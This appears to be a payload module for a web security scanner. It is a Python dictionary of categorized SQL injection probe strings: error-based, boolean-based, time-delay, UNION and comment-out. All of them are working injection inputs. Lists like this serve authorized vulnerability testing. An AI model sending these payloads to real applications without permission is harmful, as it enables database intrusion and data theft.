from enum import Enum 

class HTTPMethod(str, Enum):
    GET = "GET"
    POST = "POST"

# --- SQL Injection Payloads (Categorized) ---
SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "`", "\\", "';", "\";", "`sqlmap`",
        "' OR '1'='1", "\"' OR '\"'='\"'",
        " OR 1=1 --", " OR 1=1 #", " OR 1=1/*",
        "AND 1=1", "AND 1=2"
    ],
    "boolean_based": [
        "' AND '1'='1", "' AND '1'='2",
        "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables); --",
        "' OR 1=CAST(floor(RAND()*100) AS INT) -- "
    ],
    "time_based_light": [
        "' AND SLEEP(1)--", "' OR SLEEP(1)--",
        "1; SELECT PG_SLEEP(1)--",
        "1 WAITFOR DELAY '0:0:1'--",
        "benchmark(2000000,MD5(1))"
    ],
    "union_light": [
        "' UNION SELECT null--",
        "' UNION SELECT null,null--",
        "' UNION SELECT null,null,null--",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 'a','b','c' --",
    ],
    "comment_out": [
        "--", "#", "/*", ";"
    ]
}
